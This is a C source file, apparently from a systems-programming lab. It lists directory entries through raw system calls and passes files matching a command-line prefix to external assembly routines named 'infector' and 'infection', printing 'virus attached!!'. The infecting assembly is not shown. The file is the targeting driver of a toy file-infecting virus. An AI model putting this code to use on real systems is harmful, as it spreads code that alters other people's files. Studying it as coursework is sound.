#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

#define SYS_GETDENTS 141
#define O_RDONLY 0
#define O_DIRECTORY 00200000

/*Functions from assembly*/
extern int system_call();
extern void infection();
extern void infector();

/*Struct from getdents manual*/
struct linux_dirent {
    unsigned long  d_ino;
    int            d_off;
    unsigned short d_reclen;
    char           d_name[];
};

#define BufferSize 8192

int main (int argc , char* argv[], char* envp[])
{
    int FD;
    int i;
    long nR;
    long bP;
    char Buffer[BufferSize];
    struct linux_dirent *LiD;
    char *PreFix;

    i=0;
    PreFix = 0;
    while (i<argc)
    {
        if (strncmp(argv[i], "-a", 2) != 0)
        {
            i++;
            continue;
        }
        else if(strncmp(argv[i], "-a", 2) == 0){
            PreFix = argv[i] + 2;
            i++;
        }
    }
    
    if ((FD = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY)) == -1){
        system_call(1, 0x55);
    }

    if ((nR = system_call(SYS_GETDENTS, FD, Buffer, BufferSize)) == -1){
        system_call(1, 0x55);
    }

    for (bP = 0; bP < nR;) {
        LiD =  (Buffer + bP);
        system_call( SYS_WRITE, STDOUT, LiD->d_name, strlen(LiD->d_name));
        if  ( PreFix == 0 ){
            system_call( SYS_WRITE, STDOUT, " ", 1);
        } else  if ( strncmp(PreFix, LiD->d_name, strlen(PreFix) ) == 0){
            system_call( SYS_WRITE, STDOUT, " virus attached!!\n", 18);
            infector(LiD->d_name);
        } else {
            system_call( SYS_WRITE, STDOUT, "  \n", 3);
        }
        bP += LiD->d_reclen;
        /*system_call(SYS_WRITE, STDOUT, "\n", 1);*/
    }
    system_call(SYS_WRITE, STDOUT, "\n", 1);
    infection();

    return 0;
}